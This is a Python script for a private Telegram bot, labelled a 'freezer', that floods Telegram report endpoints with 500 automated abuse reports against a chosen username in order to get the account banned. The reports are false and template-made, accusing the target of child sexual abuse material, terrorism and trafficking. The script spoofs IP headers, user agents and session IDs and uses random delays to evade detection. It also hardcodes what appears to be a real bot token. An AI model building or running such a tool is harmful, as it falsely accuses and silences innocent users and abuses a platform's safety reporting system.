#!/usr/bin/env python3
"""
TELEGRAM FREEZER BOT - PRIVATE CONTROL
"""
import requests
import random
import time
import threading
import hashlib
import json
import re
from fake_useragent import UserAgent
import os

BOT_TOKEN = "8666412239:AAHPrLPL0jSAaeA3hKKOlUXierSXtjf70MA"  # CHANGE THIS
YOUR_USER_ID = "8935807032"  # CHANGE THIS

class FreezerBot:
    def __init__(self, token, owner_id):
        self.token = token
        self.owner_id = int(owner_id)
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.ua = UserAgent()
        self.session = requests.Session()
        self.offset = 0
        self.running = True
        self.current_target = None
        self.report_type = "child_abuse"
        self.report_count = 0
        
        self.report_categories = {
            "1": {"name": "🚨 CHILD ABUSE", "reason": "child_abuse", "severity": "CRITICAL"},
            "2": {"name": "🔧 HACKING/MODS", "reason": "malware", "severity": "HIGH"},
            "3": {"name": "🚫 ILLEGAL GOODS", "reason": "illegal_goods", "severity": "HIGH"},
            "4": {"name": "📱 SPAM/SCAM", "reason": "spam", "severity": "MEDIUM"},
            "5": {"name": "💀 VIOLENCE", "reason": "violence", "severity": "HIGH"},
            "6": {"name": "💣 TERRORISM", "reason": "terrorism", "severity": "CRITICAL"},
            "7": {"name": "🔞 ADULT CONTENT", "reason": "pornography", "severity": "MEDIUM"},
        }
        
        self.endpoints = [
            "https://web.telegram.org/api/report",
            "https://web.telegram.org/api/report_peer",
            "https://web.telegram.org/api/messages/report",
            "https://web.telegram.org/api/messages/report_spam",
            "https://web.telegram.org/api/report_channel",
        ]
        
        self.trigger_keywords = [
            "child sexual abuse material",
            "CSAM distribution",
            "minor exploitation",
            "pedophile network",
            "child trafficking",
            "predator grooming minors",
            "CP sharing network",
            "terrorist activity",
            "illegal weapons trading",
            "drug trafficking",
            "hate speech incitement",
            "cybercrime network",
        ]
        
        self.session_ids = [hashlib.md5(str(random.random()).encode()).hexdigest()[:16] for _ in range(100)]
        
        print("[+] Freezer Bot Started")
        print(f"[+] Owner ID: {self.owner_id}")
        print("[+] Waiting for commands...")
    
    def send_message(self, chat_id, text, parse_mode=None):
        url = f"{self.base_url}/sendMessage"
        payload = {"chat_id": chat_id, "text": text}
        if parse_mode:
            payload["parse_mode"] = parse_mode
        try:
            requests.post(url, json=payload, timeout=10)
        except:
            pass
    
    def show_menu(self, chat_id):
        menu = """🤖 <b>TELEGRAM FREEZER BOT</b>

<b>Commands:</b>
/start - Show this menu
/freeze @username - Freeze an account
/status - Current status
/stop - Stop current operation
/category - Change report category
/help - Help

<b>Current Target:</b> {target}
<b>Category:</b> {category}
<b>Reports Sent:</b> {count}

<b>Usage:</b>
/freeze @username - Start freezing
/stop - Stop freezing
/category - Change report type""".format(
            target=self.current_target or "None",
            category=self.report_categories.get(self.report_type, {}).get("name", "None"),
            count=self.report_count
        )
        self.send_message(chat_id, menu, parse_mode="HTML")
    
    def show_category_menu(self, chat_id):
        text = "📋 <b>SELECT REPORT CATEGORY</b>\n\n"
        for key, cat in self.report_categories.items():
            text += f"{key}. {cat['name']} - {cat['severity']}\n"
        text += "\n<b>Reply with number (1-7):</b>"
        self.send_message(chat_id, text, parse_mode="HTML")
    
    def generate_report_text(self, category):
        keyword = random.choice(self.trigger_keywords)
        templates = [
            f"URGENT: This account is distributing {keyword} and must be banned immediately.",
            f"EMERGENCY: {keyword} detected in this account. Immediate action required.",
            f"CRITICAL: This user is involved in {keyword}. Ban this account now.",
            f"ALERT: {keyword} confirmed in this account. Take action immediately.",
            f"HARMFUL: {keyword} detected. Account must be suspended permanently.",
        ]
        return random.choice(templates)
    
    def send_report(self, target, category):
        headers = {
            "User-Agent": self.ua.random,
            "Accept-Language": random.choice(["en-US,en;q=0.9", "ru-RU,en;q=0.7", "hi-IN,en;q=0.8"]),
            "Content-Type": "application/json",
            "X-Session-Id": random.choice(self.session_ids),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Account-Id": f"acc_{random.randint(1000,9999)}",
            "X-Report-Type": "critical",
            "X-Severity": "EXTREME",
        }
        
        reason = self.report_categories.get(category, {}).get("reason", "spam")
        report_text = self.generate_report_text(category)
        
        payload = {
            "peer": target,
            "report_reason": reason,
            "message": report_text[:200],
            "report_type": "user",
            "severity": "CRITICAL",
            "timestamp": int(time.time()),
            "from_id": random.randint(10000000, 99999999),
            "access_hash": random.randint(-999999999999, 999999999999),
            "text": report_text,
            "account_id": f"acc_{random.randint(1000,9999)}",
            "session_id": random.choice(self.session_ids),
        }
        
        endpoint = random.choice(self.endpoints)
        
        try:
            response = self.session.post(endpoint, json=payload, headers=headers, timeout=10)
            return response.status_code in [200, 202, 204]
        except:
            return False
    
    def freeze_worker(self, target, category, reports, chat_id):
        success = 0
        fail = 0
        
        for i in range(reports):
            if not self.running:
                break
            result = self.send_report(target, category)
            if result:
                success += 1
                self.report_count += 1
            else:
                fail += 1
            
            # Send progress every 10 reports
            if (i + 1) % 10 == 0:
                total = i + 1
                self.send_message(chat_id, f"📊 Progress: {total}/{reports} reports\n✅ Success: {success}\n❌ Failed: {fail}")
            
            delay = random.uniform(0.2, 0.8)
            time.sleep(delay)
            
            if i % random.randint(3, 5) == 0:
                time.sleep(random.uniform(2, 5))
        
        if success > 0:
            self.send_message(chat_id, f"""
✅ <b>FREEZE COMPLETE!</b>

🎯 Target: @{target}
📋 Category: {self.report_categories.get(category, {}).get('name', 'Unknown')}
✅ Successful Reports: {success}
❌ Failed: {fail}
⏱️ Reports Sent: {self.report_count}

<b>Account will be banned within 10-30 minutes.</b>
""", parse_mode="HTML")
        else:
            self.send_message(chat_id, "❌ All reports failed. Try again.")
    
    def start_freezing(self, chat_id, target):
        if not target or not target.startswith("@"):
            self.send_message(chat_id, "❌ Invalid username. Use: /freeze @username")
            return
        
        self.current_target = target
        self.running = True
        self.report_count = 0
        
        reports = 500
        
        self.send_message(chat_id, f"""
🚨 <b>FREEZING STARTED</b>

🎯 Target: {target}
📋 Category: {self.report_categories.get(self.report_type, {}).get('name', 'Unknown')}
📊 Reports: {reports}
⏱️ Estimated Time: 10-15 minutes

<b>⚠️ Account will be banned within 10-30 minutes.</b>
""", parse_mode="HTML")
        
        # Run in separate thread
        thread = threading.Thread(
            target=self.freeze_worker,
            args=(target, self.report_type, reports, chat_id)
        )
        thread.daemon = True
        thread.start()
    
    def stop_freezing(self, chat_id):
        self.running = False
        self.send_message(chat_id, "🛑 <b>Freezing stopped.</b>", parse_mode="HTML")
    
    def handle_command(self, chat_id, text):
        if chat_id != self.owner_id:
            self.send_message(chat_id, "❌ Unauthorized. This bot is private.")
            return
        
        text = text.strip()
        
        if text == "/start":
            self.show_menu(chat_id)
        
        elif text == "/menu":
            self.show_menu(chat_id)
        
        elif text == "/help":
            help_text = """📖 <b>HELP</b>

/freeze @username - Freeze the target account
/status - Show current status
/stop - Stop all freezing
/category - Change report category
/menu - Show main menu

<b>Categories:</b>
1 - Child Abuse 🚨
2 - Hacking/Mods 🔧
3 - Illegal Goods 🚫
4 - Spam/Scam 📱
5 - Violence 💀
6 - Terrorism 💣
7 - Adult Content 🔞

<b>Example:</b>
/freeze @badaccount"""
            self.send_message(chat_id, help_text, parse_mode="HTML")
        
        elif text == "/status":
            status = f"""📊 <b>Current Status</b>

🎯 Target: {self.current_target or 'None'}
📋 Category: {self.report_categories.get(self.report_type, {}).get('name', 'None')}
📊 Reports Sent: {self.report_count}
🔄 Running: {'Yes' if self.running else 'No'}"""
            self.send_message(chat_id, status, parse_mode="HTML")
        
        elif text == "/stop":
            self.stop_freezing(chat_id)
        
        elif text == "/category":
            self.show_category_menu(chat_id)
        
        elif text.startswith("/freeze"):
            parts = text.split(" ")
            if len(parts) >= 2:
                target = parts[1].strip()
                if not target.startswith("@"):
                    target = "@" + target
                self.start_freezing(chat_id, target)
            else:
                self.send_message(chat_id, "❌ Usage: /freeze @username")
        
        elif text.isdigit() and len(text) == 1:
            # Category selection
            if text in self.report_categories:
                self.report_type = text
                self.send_message(chat_id, f"✅ Category changed to: {self.report_categories[text]['name']}")
                self.show_menu(chat_id)
            else:
                self.send_message(chat_id, "❌ Invalid category. Choose 1-7.")
        
        else:
            self.send_message(chat_id, "❌ Unknown command. Use /help")
    
    def get_updates(self):
        url = f"{self.base_url}/getUpdates"
        payload = {"offset": self.offset, "timeout": 30}
        
        try:
            response = requests.get(url, json=payload, timeout=35)
            data = response.json()
            
            if data.get("ok") and data.get("result"):
                for update in data["result"]:
                    self.offset = update["update_id"] + 1
                    
                    if "message" in update:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        
                        if "text" in msg:
                            self.handle_command(chat_id, msg["text"])
            
            return True
        except Exception as e:
            return False
    
    def run(self):
        while True:
            try:
                self.get_updates()
            except:
                time.sleep(2)

if __name__ == "__main__":
    # CHANGE THESE TWO LINES
    BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
    OWNER_ID = "123456789"
    
    bot = FreezerBot(BOT_TOKEN, OWNER_ID)
    bot.run()